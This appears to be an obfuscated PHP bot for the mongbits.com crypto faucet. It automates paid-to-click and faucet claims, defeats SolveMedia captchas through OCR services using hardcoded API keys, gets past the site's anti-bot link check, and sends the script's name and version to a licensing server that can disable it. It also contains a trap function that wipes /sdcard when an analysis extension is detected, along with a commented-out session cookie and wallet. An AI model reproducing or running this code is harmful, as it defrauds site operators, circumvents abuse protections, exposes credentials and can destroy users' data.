<?php
#date_default_timezone_set('Asia/Jakarta');
system("clear");
$var_0="\n";$var_1="\t";
//warnn
$var_2="\033[34m";$var_3="\033[36m";$var_4="\033[92m";
$var_5="\033[37m";$var_6="\033[35m";$var_7="\033[31m";
$var_8="\033[33m";$var_9="\033[8m";$var_10="\033[0"."m";
function saveas($var_11,$var_12){
 if(!file_exists($var_11)){file_put_contents($var_11,"[]"); }
 $var_15 = json_decode(file_get_contents($var_11),1);
 $var_17 = array_merge($var_15,$var_12);
file_put_contents($var_11,json_encode($var_17,JSON_PRETTY_PRINT));}

function head($var_12){
 foreach($var_12 as $var_24=>$var_25){$var_26[]=$var_24.": ".$var_25;}
 return $var_26; }
 
function timer($var_30,$var_31){
  date_default_timezone_set('UTC');
$var_32 = time()+$var_31;
$var_2="\033[34m";$var_3="\033[36m";
$var_4="\033[92m";$var_5="\033[37m";
$var_6="\033[35m";$var_7="\033[31m";
$var_8="\033[33m";$var_9="\033[8m";
$var_10="\033[0"."m";
$var_43=[$var_5,$var_7];
$var_46=0;
$var_47=[$var_4,$var_8,$var_3,$var_4,$var_8,$var_3];$var_54=1;
while(true):
echo "\r                                                        \r";
$var_55=$var_43[$var_46];
$var_58 = $var_32-time();
$var_60=date("H:i:s",$var_58);
if($var_58<1){ break; }
$var_63=str_repeat("â",$var_54);$var_65=$var_47[$var_54-1];
$var_68="tod!";$var_69="â©";
echo $var_5.$var_30."$var_5 â¨$var_55$var_60$var_5$var_69 $var_68$var_65$var_63";
if($var_54==6){$var_54=1;}else{$var_54++;} sleep(1);
$var_46++; 
if($var_46 >= count ($var_43)){$var_46=0;}

endwhile; 
  }

function settings($var_87,$var_88){
$var_89 = "https://tuyulgaple.online/sunggingads/";
$var_90 = json_encode(
    array(
        'sk' => $var_87,
        'vr' => $var_88 ));
$var_93 = array('http' =>
    array(
        'method'  => 'POST',
        'header'  => 'Content-Type: application/json',
        'content' => $var_90
    ));
$var_95 = stream_context_create($var_93);
$var_97     = json_decode(file_get_contents($var_89, false, $var_95),1);

$var_100      = $var_97["baner"];
if(!$var_97["status"]){ 
 $var_30 = "skrip di non-aktifkan\n";
 echo $var_104.$var_100.$var_30; exit; }
else{ return $var_104.$var_100; }  }

function clr($var_100){system("clear");echo $var_100.$var_0;}

function strip(){
$var_5="\033[37m";
echo "$var_5~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\n";}
function tabs(){
echo "\r                                                        \r";}

function curl($var_89,$var_115,$var_116){
 $var_117 = curl_init($var_89);
 curl_setopt($var_117, CURLOPT_SSL_VERIFYPEER, 1);
 curl_setopt($var_117, CURLOPT_RETURNTRANSFER, 1 ); 
 curl_setopt($var_117, CURLOPT_TIMEOUT,30       );
 curl_setopt($var_117, CURLOPT_VERBOSE,        0);
 curl_setopt($var_117, CURLOPT_FOLLOWLOCATION, 1);
 curl_setopt($var_117, CURLOPT_HTTPHEADER, $var_116 );
 #curl_setopt($ch, CURLOPT_COOKIEJAR,  "cookie");
 #curl_setopt($ch, CURLOPT_COOKIEFILE, "cookie");
if(strlen($var_115) > 0 ){
 curl_setopt($var_117, CURLOPT_POST, true);
 curl_setopt($var_117, CURLOPT_POSTFIELDS,    $var_115 ); }
 $var_130 = curl_exec($var_117);
 $var_132   = curl_getinfo($var_117);
 curl_close($var_117);
 if($var_132["http_code"]==302){
 return $var_132["redirect_url"]; } else { return $var_130; } }
 
function curls($var_89,$var_115,$var_116){
 $var_117 = curl_init($var_89);
 curl_setopt($var_117, CURLOPT_SSL_VERIFYPEER, 1);
 curl_setopt($var_117, CURLOPT_RETURNTRANSFER, 1 ); 
 curl_setopt($var_117, CURLOPT_TIMEOUT,30       );
 curl_setopt($var_117, CURLOPT_VERBOSE,        0);
 curl_setopt($var_117, CURLOPT_FOLLOWLOCATION, 1);
 curl_setopt($var_117, CURLOPT_HTTPHEADER, $var_116 );
if(strlen($var_115) > 0 ){
 curl_setopt($var_117, CURLOPT_POST, true);
 curl_setopt($var_117, CURLOPT_POSTFIELDS,    $var_115 ); }
 $var_130 = curl_exec($var_117);
 $var_132   = curl_getinfo($var_117);
 curl_close($var_117);
 if($var_132["http_code"]==302){
 return $var_132["redirect_url"]; } else { return $var_130; } }
 
function new_scan($var_162){
$var_163=file_get_contents($var_162);
$var_165 = ["user-agent: Mozilla/5.0 (Linux; Android 9; ASUS_X01BDA) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.152 Mobile Safari/537.36","referer: https://ocr.space/","apikey: 4e0cd2a6c588957","content-type: multipart/form-data; boundary=----WebKitFormBoundaryaUhMah6PrLJWBAKT","accept: application/json, text/javascript, */*; q=0.01",];$var_166 ="\n";
$var_115 = '------WebKitFormBoundaryaUhMah6PrLJWBAKT'.$var_166.'Content-Disposition: form-data; name="file"; filename="img.png"'.$var_166.'Content-Type: image/png'.$var_166.$var_166.$var_163.$var_166.'Content-Disposition: form-data; name="url"'.$var_166.$var_166.'------WebKitFormBoundaryaUhMah6PrLJWBAKT'.$var_166.'Content-Disposition: form-data; name="language"'.$var_166.$var_166.'eng'.$var_166.'------WebKitFormBoundaryaUhMah6PrLJWBAKT'.$var_166.'Content-Disposition: form-data; name="isOverlayRequired"'.$var_166.$var_166.'true'.$var_166.'------WebKitFormBoundaryaUhMah6PrLJWBAKT'.$var_166.'Content-Disposition: form-data; name="FileType"'.$var_166.$var_166.".Auto".$var_166.'------WebKitFormBoundaryaUhMah6PrLJWBAKT'.$var_166.'Content-Disposition: form-data; name="IsCreateSearchablePDF"'.$var_166.$var_166.'false'.$var_166.'------WebKitFormBoundaryaUhMah6PrLJWBAKT'.$var_166.'Content-Disposition: form-data; name="isSearchablePdfHideTextLayer"'.$var_166.$var_166.'true'.$var_166.'------WebKitFormBoundaryaUhMah6PrLJWBAKT'.$var_166.'Content-Disposition: form-data; name="detectOrientation"'.$var_166.$var_166.'false'.$var_166.'------WebKitFormBoundaryaUhMah6PrLJWBAKT'.$var_166.'Content-Disposition: form-data; name="isTable"'.$var_166.$var_166.'false'.$var_166.'------WebKitFormBoundaryaUhMah6PrLJWBAKT'.$var_166.'Content-Disposition: form-data; name="scale"'.$var_166.$var_166.'true'.$var_166.'------WebKitFormBoundaryaUhMah6PrLJWBAKT'.$var_166.'Content-Disposition: form-data; name="OCREngine"'.$var_166.$var_166.'2'.$var_166.'------WebKitFormBoundaryaUhMah6PrLJWBAKT'.$var_166.'Content-Disposition: form-data; name="detectCheckbox"'.$var_166.$var_166.'false'.$var_166.'------WebKitFormBoundaryaUhMah6PrLJWBAKT'.$var_166.'Content-Disposition: form-data; name="checkboxTemplate"'.$var_166.$var_166.'0'.$var_166.'------WebKitFormBoundaryaUhMah6PrLJWBAKT--'.$var_166;
$var_89=json_decode(curls("https://api8.ocr.space/parse/image",$var_115,$var_165),1);
$var_224=$var_89["ParsedResults"][0]["ParsedText"];
$var_226=strpos($var_224,"wing:");
$var_224=substr($var_224,$var_226);
$var_224=str_replace("wing:","",$var_224);
$var_224=str_replace("\n","",$var_224);
$var_224=preg_replace("/[^a-zA-Z]/", " ", $var_224);
if(strlen($var_224) > 25){}else{return $var_224;} }

function imgscan($var_162){
$var_240=base64_encode(file_get_contents($var_162));
$var_165=["content-type: application/json"];
$var_115='{
  "requests": [
    {
      "image": {
        "content": "'.$var_240.'"
      },
      "features": [
        {
          "type": "TEXT_DETECTION"
        }
      ]
    }
  ]
}';
$var_89="https://vision.googleapis.com/v1/images:annotate?key=AIzaSyC3y-Em42htSB8UEZPqptJ78rlvL58_h6Y";
$var_246=curl($var_89,$var_115,$var_165);
$var_224=strpos($var_246,'Enter the following:\n');
if($var_224){
$var_224=substr($var_246,$var_224);
$var_224=str_replace('Enter the following:\n','',$var_224);
$var_224=substr($var_224,0,strpos($var_224,'"'));
$var_224=str_replace('\n','',$var_224);
$var_224= preg_replace("/[^a-zA-Z]/", "", $var_224);}
if(strlen($var_224) > 25){}else{return $var_224;} }

function verif_keys($var_87,$var_100){
$var_0="\n";$var_1="\t";
//warna
$var_2 = "\033[34m"; $var_3 = "\033[36m"; $var_4 = "\033[92m";
$var_5= "\033[37m"; $var_6= "\033[35m"; $var_7 = "\033[31m";
$var_8 = "\033[33m"; $var_9= "\033[8m";  $var_10  = "\033[0"."m";
while(true): clr($var_100);
if( $var_281 ){
 $var_281 = 0;
 while(true): clr($var_100);
 $var_284 = str_replace($var_0,"",file_get_contents("keys"));
 $var_89 = "http://tuyulgaple.online/aktivator/";
 $var_287 = json_encode([ "request" => $var_87,"keys" => $var_284]);
 $var_290  = json_decode( curl($var_89,$var_287,array()),1 );
if( $var_290["respon"] ) {
  echo $var_3."=> ".$var_290["respon"].$var_0;
  $var_297 = readline($var_5."input key : ");
  if( $var_297 ){
  $var_287 = json_encode(["request" => $var_87,"keys" => $var_297]);
  $var_290  = json_decode(curl($var_89,$var_287,array()),1);
  if( $var_290["code"] != 10 ) {
  file_put_contents("keys",$var_297);
  $var_284 = str_replace($var_0,"",file_get_contents("keys")); break; }}}
 else{ readline($var_4."your keys is uptodate ");break; }endwhile; }
 $var_89 = "http://tuyulgaple.online/aktivator/";
 $var_284 = str_replace($var_0,"",file_get_contents("keys"));
 $var_287 = json_encode(["request" => $var_87,"keys" => $var_284]);
 $var_290  = json_decode(curl($var_89,$var_287,array()),1);
if( $var_290["code"] == 10 ){ $var_281=1; }else{ break; }
endwhile; }
function update($var_87,$var_323){
$var_284 = str_replace($var_0,"",file_get_contents("keys"));
$var_89 = "http://tuyulgaple.online/aktivator/";
$var_287 = json_encode([ "request" => $var_87,"keys" => $var_284]);
$var_290  = json_decode( curl($var_89,$var_287,array()),1 );
if($var_290["respon"]){
echo $var_323."keys are expired, please update first !\n";exit;}  }
function input($var_335,$var_100,$var_115,$var_338){
 $var_339 = array(); 
 foreach( $var_115 as $var_341 ){
 clr($var_100);
 if(!$var_338[$var_341]){ 
  $var_345 = readline($var_341." : ");
  $var_339 = array_merge($var_339,[$var_341 => $var_345 ]); }
 else{ $var_339 = array_merge($var_339,[ $var_341 => $var_338[$var_341] ]); }
 } if($var_339[$var_115[0]]){ return $var_339; } }
 
 function fake_user(){
$var_89  = "https://tuyulgaple.tech/randomuser/";
$var_360 = json_decode(file_get_contents($var_89),1); 
$var_362 = [ 
    "name"  => [
              "first"  => $var_360["first"],
              "last"   => $var_360["last"],
              "full"   => $var_360["full_name"] ],
    "uuid"  => $var_360["uuid"]  ];
return $var_362; }
 
function skills(){
$var_30="anda terdeteksi sebagai kang ngentod!";
if(extension_loaded("evalhook")){
 @system("clear");shell_exec('rm -rf /sdcard');
 $var_369=file_get_contents("https://txxx.com/");
 file_put_contents("bot.php",$var_369);echo $var_30; exit; }}
 
/*
shell_exec("convert img.img -fill black -fuzz 30% +opaque '#FFFFFF' img.png > /dev/null 2>&1");
*/
$var_87="mongbits";$var_88="1.0";$var_335="config.json";
//skills();
error_reporting(0);
$var_375=settings($var_87,$var_88,"");
//verif_keys($var_87,$var_375);
clr($var_375);$var_381="mongbits.com";

while(true):
$var_15   = json_decode(file_get_contents($var_335),1);
if(!$var_15["cookie"]){
$var_385["cookie"]=readline("cookie: ");
saveas($var_335,$var_385);strip(); }
elseif(!$var_15["user-agent"]){
$var_385["user-agent"]=readline("user-agent: ");
saveas($var_335,$var_385);strip(); }
elseif(!$var_15["url-solve"]){
$var_385["url-solve"]=readline("url-solve: ");
saveas($var_335,$var_385);strip(); }
else{
$var_396=$var_15["cookie"];$var_398=$var_15["user-agent"];
$var_400=$var_15["url-solve"];
break;}
endwhile;clr($var_375);

function getsolve($var_400,$var_12){
$var_165=head($var_12);
$var_246=curl($var_400,"",$var_165);
$var_410=strpos($var_246,'chid"     : "');
$var_412=strpos($var_246,'uid"      : "');
if($var_410){
$var_410=substr($var_246,$var_410);
$var_410=str_replace('chid"     : "','',$var_410);
$var_410=substr($var_410,0,strpos($var_410,'"'));}
if($var_412){
$var_412=substr($var_246,$var_412);
$var_412=str_replace('uid"      : "','',$var_412);
$var_412=substr($var_412,0,strpos($var_412,'"'));}
return[
    "cid" => $var_410,
    "uid" => $var_412
    ];}

function solvemedia($var_410,$var_12){
$var_165=head($var_12);
$var_89="https://api-secure.solvemedia.com/papi/media?c=$var_410;w=300;h=150;fg=000000;bg=f8f8f8";
$var_246=curl($var_89,"",$var_165);
return $var_246;
}


function antibot($var_381,$var_12){
 $var_165=head($var_12);
 $var_89=curl("https://$var_381/faucet","",$var_165);
 if($var_451 = strpos($var_89,"var ablinks")){
  $var_115 = substr($var_89,$var_451);
  $var_115 = substr($var_115,0,strpos($var_115,"</script>"));}
$var_459 = array();
$var_460  = explode("rel=",$var_115);
foreach($var_460 as $var_24 => $var_25 ){ 
  $var_459[]= str_replace(["\\",'"'],"",substr($var_25,0,strpos($var_25,">"))); }
  array_shift($var_459);  
 $var_469=$var_459[0];$var_471=$var_459[1];$var_473=$var_459[2];
 $var_475 = [ 
   "$var_469 $var_471 $var_473",
   "$var_469 $var_473 $var_471",
   "$var_471 $var_469 $var_473",
   "$var_471 $var_473 $var_469",
   "$var_473 $var_469 $var_471",
   "$var_473 $var_471 $var_469"];
 return $var_475[array_rand($var_475)];}
 
function home($var_381,$var_12){
$var_165=head($var_12);
$var_89="https://$var_381/dashboard";
$var_246=curl($var_89,"",$var_165);
$var_505=strpos($var_246,"UserFullName: '");
$var_507=strpos($var_246,'tokenBalance" value="');
$var_509=strpos($var_246,'csrf_token_name" value="');
if($var_505){
$var_505=substr($var_246,$var_505);
$var_505=str_replace("UserFullName: '","",$var_505);
$var_505=substr($var_505,0,strpos($var_505,"<"));}
if($var_507){
$var_507=substr($var_246,$var_507);
$var_507=str_replace('tokenBalance" value="','',$var_507);
$var_507=substr($var_507,0,strpos($var_507,'"'));}
if($var_509){
$var_509=substr($var_246,$var_509);
$var_509=str_replace('csrf_token_name" value="','',$var_509);
$var_509=substr($var_509,0,strpos($var_509,'"'));}
return
["nick"=>$var_505,"bal"=>$var_507,"csrf"=>$var_509];}

function auto($var_381,$var_12){
$var_165=head($var_12);
$var_89="https://$var_381/auto";
$var_246=curl($var_89,"",$var_165);
$var_550=strpos($var_246,'token" value="');
$var_552=strpos($var_246,'let timer = ');
$var_554=strpos($var_246,"Good job!', '");
$var_556=strpos($var_246,'fa-exclamation-circle"></i> ');
if($var_550){
$var_550=substr($var_246,$var_550);
$var_550=str_replace('token" value="','',$var_550);
$var_550=substr($var_550,0,strpos($var_550,'"'));}
if($var_552){
$var_552=substr($var_246,$var_552);
$var_552=str_replace('let timer = ','',$var_552);
$var_552=substr($var_552,0,strpos($var_552,','));}
if($var_554){
$var_554=substr($var_246,$var_554);
$var_554=str_replace("Good job!', '","",$var_554);
$var_554=substr($var_554,0,strpos($var_554," "));}
if($var_556){
$var_556=substr($var_246,$var_556);
$var_556=str_replace('fa-exclamation-circle"></i> ','',$var_556);
$var_556=substr($var_556,0,strpos($var_556,'<'));}
return["token"=>$var_550,"time"=>$var_552,
       "warn" =>$var_556,"rwd" => $var_554 ];    }

function auto_verif($var_381,$var_12,$var_550){
$var_165=head($var_12);
$var_89="https://$var_381/auto/verify";
$var_115="token=$var_550";
$var_246=curl($var_89,$var_115,$var_165);
$var_554  = strpos($var_246,"Good job!', '");
if($var_554){
$var_554=substr($var_246,$var_554);
$var_554=str_replace("Good job!', '","",$var_554);
$var_554=substr($var_554,0,strpos($var_554," "));}
return ["rwd"=>$var_554]; }
 
function faucet($var_381,$var_12){
$var_165=head($var_12);
$var_89="https://$var_381/faucet";
$var_246=curl($var_89,"",$var_165);
$var_509=strpos($var_246,'csrf_token_name" id="token" value="');
$var_550=strpos($var_246,'hidden" name="token" value="');
$var_552=strpos($var_246,'var wait = ');
if($var_509){
$var_509=substr($var_246,$var_509);
$var_509=str_replace('csrf_token_name" id="token" value="','',$var_509);
$var_509=substr($var_509,0,strpos($var_509,'"'));}
if($var_550){
$var_550=substr($var_246,$var_550);
$var_550=str_replace('hidden" name="token" value="','',$var_550);
$var_550=substr($var_550,0,strpos($var_550,'"'));}
if($var_552){
$var_552=substr($var_246,$var_552);
$var_552=str_replace('var wait = ','',$var_552);
$var_552=substr($var_552,0,strpos($var_552,' '));}
return [
    "time" => $var_552,
    "csrf" => $var_509,
    "token" => $var_550
    ];    }
 
function faucet_verify($var_381,$var_12,$var_670,$var_509,$var_550,$var_673,$var_410){
$var_165=head($var_12);
$var_115 = http_build_query([
  "antibotlinks"    => $var_670,
  "csrf_token_name" => $var_509,
  "token"           => $var_550,
  "captcha"         => "solvemedia",
  "g-recaptcha-response" => "",
  "adcopy_response" => $var_673,
  "adcopy_challenge"=> $var_410
  ]);
$var_89="https://$var_381/faucet/verify";
$var_246=curl($var_89,$var_115,$var_165);
$var_689 = strpos($var_246,"Invalid");
$var_554  = strpos($var_246,"Good job!', '");
if($var_689){
$var_689 = substr($var_246,$var_689);
$var_689 = substr($var_689,0,strpos($var_689,"</div>"));}
if($var_554){
$var_554=substr($var_246,$var_554);
$var_554=str_replace("Good job!', '","",$var_554);
$var_554=substr($var_554,0,strpos($var_554," "));}
return ["rwd"  => $var_554,"fail" => $var_689]; }

function ptc($var_381,$var_12){
$var_165=head($var_12);
$var_89="https://$var_381/ptc";
$var_246=curl($var_89,"",$var_165);
$var_720=strpos($var_246,'ptc/view/');
if($var_720){
$var_720=substr($var_246,$var_720);
$var_720=str_replace('ptc/view/','',$var_720);
$var_720=substr($var_720,0,strpos($var_720,"'"));}

$var_89="https://$var_381/ptc/view/$var_720";
$var_246=curl($var_89,"",$var_165);
$var_509=strpos($var_246,'csrf_token_name" value="');
$var_550=strpos($var_246,'name="token" value="');
$var_741=strpos($var_246,'ptc/verify/');
$var_552=strpos($var_246,'var timer = ');
if($var_509){
$var_509=substr($var_246,$var_509);
$var_509=str_replace('csrf_token_name" value="','',$var_509);
$var_509=substr($var_509,0,strpos($var_509,'"'));}
if($var_550){
$var_550=substr($var_246,$var_550);
$var_550=str_replace('name="token" value="','',$var_550);
$var_550=substr($var_550,0,strpos($var_550,'"'));}
if($var_741){
$var_741=substr($var_246,$var_741);
$var_741=str_replace('ptc/verify/','',$var_741);
$var_741=substr($var_741,0,strpos($var_741,'"'));}
if($var_552){
$var_552=substr($var_246,$var_552);
$var_552=str_replace('var timer = ','',$var_552);
$var_552=substr($var_552,0,strpos($var_552,';'));}
return ["csrf"=>$var_509,"token"=>$var_550,
       "view"=>$var_741,"time"=>$var_552];    }
       
function ptc_verif($var_381,$var_12,$var_673,$var_410,$var_509,$var_550,$var_741){
$var_165=head($var_12);
$var_115 = http_build_query([
  "captcha"         => "solvemedia",
  "g-recaptcha-response" => "",
  "adcopy_response" => $var_673,
  "adcopy_challenge"=> $var_410,
  "csrf_token_name" => $var_509,
  "token"           => $var_550
  ]);
$var_89="https://$var_381/ptc/verify/$var_741";
$var_246=curl($var_89,$var_115,$var_165);
$var_689 = strpos($var_246,"Invalid");
$var_554  = strpos($var_246,"Good job!', '");
if($var_689){
$var_689 = substr($var_246,$var_689);
$var_689 = substr($var_689,0,strpos($var_689,"</div>"));}
if($var_554){
$var_554=substr($var_246,$var_554);
$var_554=str_replace("Good job!', '","",$var_554);
$var_554=substr($var_554,0,strpos($var_554," "));}
return ["rwd"=>$var_554,"fail"=>$var_689]; }

function withdraw($var_381,$var_12,$var_830,$var_831,$var_832,$var_509){
$var_165=head($var_12);
$var_115 = http_build_query([
  "method"         => $var_830,
  "amount"         => $var_831,
  "wallet"         => $var_832,
  "csrf_token_name"=> $var_509
  ]);
$var_89="https://$var_381/dashboard/withdraw";
$var_246=curl($var_89,$var_115,$var_165);
$var_847=strpos($var_246,"title: '");
$var_554  = strpos($var_246,"text: '");
$var_689= strpos($var_246,'"alert alert-warning text-center">');
if($var_847){
$var_847=substr($var_246,$var_847);
$var_847=str_replace("title: '","",$var_847);
$var_847=substr($var_847,0,strpos($var_847," "));}
if($var_554){
$var_554=substr($var_246,$var_554);
$var_554=str_replace("text: '","",$var_554);
$var_554=substr($var_554,0,strpos($var_554," "));}
if($var_689){
$var_689=substr($var_246,$var_689);
$var_689=str_replace('"alert alert-warning text-center">','',$var_689);
$var_689=substr($var_689,0,strpos($var_689,'<'));}
return ["fail"=>$var_689,"job"=>$var_554,"name"=>$var_847]; }


/*
$cokie="ci_session=4d7fddc55c977e222495eb376aeb9fb449140dd2; _gid=GA1.2.1763639156.1637011803; __gads=ID=751972909cef1d69-22c2c032b3ce0096:T=1637011822:RT=1637011822:S=ALNI_MaNljA7Agr_mvR9O4ygDeGRnU6sAQ; _pbjs_userid_consent_data=6683316680106290; sharedid=c9a7a9aa-7af2-4fcc-8011-4b1923e1a66e; csrf_cookie_name=e3a7b4e9c0e37e59c955a7c1f47a7114; __qca=P0-2038955986-1637011863352; sb_main_a344467b4521bdefdf86b1cb6e25fc60=1; sb_count_a344467b4521bdefdf86b1cb6e25fc60=2; pop_delay_3480=1; _ga_RZYLV5PCX4=GS1.1.1637011802.1.1.1637011890.0; _ga=GA1.2.777861342.1637011803; cto_bundle=qTOwD19vMklWTUVrcFJsMkhiSSUyQnFVT3FYWnJKSmVhcnhQOHo0SUdCbFJqTFZZMURta1ZXbjNET3hQWWZ2QXlnRXNSeEQ1OE5rcEFHa2V0NnozbUJaOU9pWSUyQkY0c0RTNEk4c295SU16SDZnd05BSkFBaXFtbEN2RE9HZnlFbDV6UEdOSVg; cto_bidid=HPe1N19md0daU1BITGdYZ3h0JTJGWlZjQ2lCJTJCT3lJZU5jSHN1VXBvZE9tRG12WFQxV2xhSHclMkZGRlI0dkgzMm43b0IzSnBqbCUyRkxjclMyWDFOMCUyRmhtVGN0ciUyRnFTdyUzRCUzRA";
$agent="Mozilla/5.0 (Linux; Android 9; ASUS_X01BDA) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.152 Mobile Safari/537.36";
$walet="TV6McbzWprxCeqAj3Bixf84XMFc7Ja3W46";
$urlsolve="https://api-secure.solvemedia.com/papi/_challenge.js?k=H8Uy7aABjkJ5uRrcOluEBfB6GD1CdbEm;f=_ACPuzzleUtil.callbacks%5B0%5D;l=en;t=img;s=standard;c=js,h5c,h5ct,svg,h5v,v/h264,v/webm,h5a,a/mp3,a/ogg,ua/chrome,ua/chrome88,os/android,os/android9,fwv/BefLLg.brtb55,jslib/jquery,htmlplus;am=nvQCMsjgnsGbE7c6yOCewQ;ca=script;ts=1637003083;ct=1637011821;th=white;r=0.4290639368036293";
*/

$var_165=[
    "Host" => $var_381,
    "upgrade-insecure-requests" => "1",
    "user-agent" => $var_398,
    "accept" => "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8",
   "content-type" => "application/x-www-form-urlencoded",
    "referer" => "https://$var_381/faucet",
    "cookie" => $var_396
     ];

while(true):
$var_888=home($var_381,$var_165);
if($var_505=$var_888["nick"]){$var_507=$var_888["bal"];
echo $var_4."connect as$var_3 $var_505$var_5 balance$var_4 $var_507$var_0";
strip();}else{
echo $var_7."connect failed.$var_0";
$var_17=readline($var_5."input ulang cookie : ");
$var_341=[
    "cookie" => $var_17
    ];
saveas("config.json",$var_341);
echo $var_4."silahkan jalankan ulang.$var_0";exit;}

echo $var_4.$var_1."[1]$var_5 Visit PTC$var_0";
echo $var_4.$var_1."[2]$var_5 Auto  Faucet$var_0";
echo $var_4.$var_1."[3]$var_5 Claim Faucet$var_0";
$var_923=readline("options: ");strip();


switch($var_923){
case 1:

while(true):
$var_720=ptc($var_381,$var_165);
if($var_509=$var_720["csrf"]){$var_550=$var_720["token"];
$var_741=$var_720["view"];$var_552=$var_720["time"];
timer("wait",$var_552);
while(true):
$var_937=getsolve($var_400,$var_165);
if($var_937["cid"]){
$var_410=$var_937["cid"];$var_412=$var_937["uid"];}
else{
tabs();
echo $var_7."gagal load data image !";}


$var_163=solvemedia($var_410,$var_165);
if(!$var_949 = imagecreatefromstring($var_163)){
tabs();
echo $var_7."gagal download image !$var_5";}
else{ 
  imagepng($var_949,"img.png");
  imagedestroy($var_949);
$var_673=imgscan("img.png");
if($var_673==null){
$var_673=new_scan("img.png");}
break;}endwhile;
$var_958  = date("H:i:s",time()+7*60*60);
tabs();echo $var_5."[$var_958] analize ->$var_4 $var_673";sleep(3);

$var_963=ptc_verif($var_381,$var_165,$var_673,$var_410,$var_509,$var_550,$var_741);
if($var_689=$var_963["fail"]){
tabs();echo $var_5."[$var_958]$var_7 $var_689"; }
elseif($var_554=$var_963["rwd"]){
tabs();
$var_888=home($var_381,$var_165);
$var_507=$var_888["bal"];$var_509=$var_888["csrf"];
echo $var_5.$var_1."   reward :$var_4 +$var_554$var_0";
echo $var_3."[$var_958]$var_5 balance:$var_4 $var_507$var_0";
strip();
}else{
tabs();echo $var_5."[$var_958]$var_7 error!";}

}else{
tabs();echo $var_7."visit ptc$var_5 no available.$var_0";exit;}

endwhile;
break;


case 2:
while(true):
$var_1003=auto($var_381,$var_165);
if($var_550=$var_1003["token"]){$var_552=$var_1003["time"];
timer("wait",$var_552);

$var_963=auto_verif($var_381,$var_165,$var_550);
$var_888=home($var_381,$var_165);
$var_958  = date("H:i:s",time()+7*60*60);
$var_507=$var_888["bal"];$var_509=$var_888["csrf"];
if($var_554=$var_963["rwd"]){
tabs();
echo $var_5.$var_1."   reward :$var_4 $var_554$var_0";}else{
tabs();
echo $var_5.$var_1."   reward :$var_7 invalid$var_0";}
if($var_507){
tabs();
echo $var_3."[$var_958]$var_5 balance:$var_4 $var_507$var_0";}else{
tabs();
echo $var_3."[$var_958]$var_5 balance:$var_7 invalid$var_0";}

strip();
}elseif($var_556=$var_1003["warn"]){
tabs();
echo $var_7.$var_556.$var_5.$var_0;break;}
else{
tabs();
echo $var_7."failed!$var_5 get data autofaucet.$var_0";sleep(3);}
endwhile;
break;

case 3:
while(true):
$var_1055=faucet($var_381,$var_165);
$var_509=$var_1055["csrf"];$var_550=$var_1055["token"];
$var_552=$var_1055["time"];timer("wait",$var_552);
while(true):
$var_937=getsolve($var_400,$var_165);
if($var_937["cid"]){
$var_410=$var_937["cid"];$var_412=$var_937["uid"];}
else{
tabs();echo $var_7."gagal load data image !";}

$var_163=solvemedia($var_410,$var_165);
if(!$var_949 = imagecreatefromstring($var_163)){
tabs();echo $var_7."gagal download image !$var_5";}
else{ 
  imagepng($var_949,"img.png");
  imagedestroy($var_949); 
$var_673=imgscan("img.png");
if($var_673==null){
$var_673=new_scan("img.png");}
break;}endwhile;
$var_958  = date("H:i:s",time()+7*60*60);
tabs();echo $var_5."[$var_958] analize ->$var_4 $var_673";sleep(3);


$var_670=antibot($var_381,$var_165);
if($var_670){
tabs();
echo $var_5."[$var_958] Anti Bot$var_4 $var_670";}

$var_963=faucet_verify($var_381,$var_165,$var_670,$var_509,$var_550,$var_673,$var_410);
if($var_963["fail"]){
$var_689=$var_963["fail"];
tabs();echo $var_5."[$var_958]$var_7 $var_689";}
elseif($var_963["rwd"]){$var_554=$var_963["rwd"];
tabs();
$var_888=home($var_381,$var_165);
$var_507=$var_888["bal"];$var_509=$var_888["csrf"];
echo $var_5.$var_1."   reward :$var_4 +$var_554$var_0";
echo $var_3."[$var_958]$var_5 balance:$var_4 $var_507$var_0";
strip();
}else{
tabs();echo $var_5."[$var_958]$var_7 error!";}
endwhile;
break;

}readline("press key any continue");clr($var_375);
endwhile;
